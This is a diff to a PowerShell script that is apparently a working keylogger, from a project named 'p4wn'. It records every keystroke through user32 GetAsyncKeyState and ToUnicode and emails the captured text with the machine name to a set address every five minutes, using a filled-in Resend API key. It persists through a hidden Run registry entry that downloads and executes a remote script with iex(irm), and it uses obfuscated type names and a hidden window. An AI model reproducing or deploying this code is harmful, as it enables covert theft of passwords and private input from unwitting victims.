@@ -1,9 +1,13 @@
-$c=@{k='re_TU_CLAVE';t='TU_CORREO@gmail.com';u='https://raw.githubusercontent.com/TU_USUARIO/p4wn/main/k.ps1';m=5;n='WinSvcHost'}
+$u='https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1'
+$k='re_E5RqtiUa_DGW5Anr6waHxtoJ4Zexay5EB'
+$t='elgono_9@hotmail.com'
+$m=5
+$n='WinSvcHost'
 
-$mx=New-Object System.Threading.Mutex($false,"Local\$($c.n)")
+$mx=New-Object System.Threading.Mutex($false,"Local\$n")
 if(-not $mx.WaitOne(0)){exit}
 
-schtasks /create /tn $c.n /sc onlogon /f /tr "powershell -NoP -W Hidden -C iex(irm '$($c.u)')" | Out-Null
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $n -Value "powershell -W Hidden -c iex(irm '$u')" -Force
 
 Add-Type -MemberDefinition @'
 [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
@@ -20,23 +24,23 @@ $t0=Get-Date
 $buf=''
 
 while($true){
-  for($k=8;$k -lt 255;$k++){
-    if([Qz.Wk7]::GetAsyncKeyState($k) -band 0x8000){
-      if(-not $dn[$k]){
-        $dn[$k]=$true
-        if($sp.ContainsKey($k)){ $ch=$sp[$k] }
-        else {
+  for($i=8;$i -lt 255;$i++){
+    if([Qz.Wk7]::GetAsyncKeyState($i) -band 0x8000){
+      if(-not $dn[$i]){
+        $dn[$i]=$true
+        if($sp.ContainsKey($i)){ $ch=$sp[$i] }
+        else{
           [void][Qz.Wk7]::GetKeyboardState($ks)
-          $r=[Qz.Wk7]::ToUnicode([uint32]$k,0,$ks,$sb,64,0)
+          $r=[Qz.Wk7]::ToUnicode([uint32]$i,0,$ks,$sb,64,0)
           $ch=if($r -ge 1){$sb.ToString()}else{''}
         }
         if($ch){$buf+=$ch}
       }
-    } else { $dn[$k]=$false }
+    } else { $dn[$i]=$false }
   }
-  if(((Get-Date)-$t0).TotalMinutes -ge $c.m -and $buf.Length -gt 0){
-    $b=@{from='onboarding@resend.dev';to=$c.t;subject="$env:COMPUTERNAME $(Get-Date -f 'dd/MM HH:mm')";text=$buf}|ConvertTo-Json -Compress
-    try{ irm 'https://api.resend.com/emails' -Method Post -Headers @{Authorization="Bearer $($c.k)"} -ContentType 'application/json' -Body $b -TimeoutSec 20 | Out-Null }catch{}
+  if(((Get-Date)-$t0).TotalMinutes -ge $m -and $buf.Length -gt 0){
+    $j='{"from":"onboarding@resend.dev","to":"'+$t+'","subject":"'+$env:COMPUTERNAME+'","text":'+(ConvertTo-Json $buf)+'}'
+    try{ iwr 'https://api.resend.com/emails' -Method Post -Headers @{Authorization="Bearer $k"} -ContentType 'application/json' -Body $j -UseBasicParsing -TimeoutSec 20 | Out-Null }catch{}
     $buf=''; $t0=Get-Date
   }
   Start-Sleep -Milliseconds 12
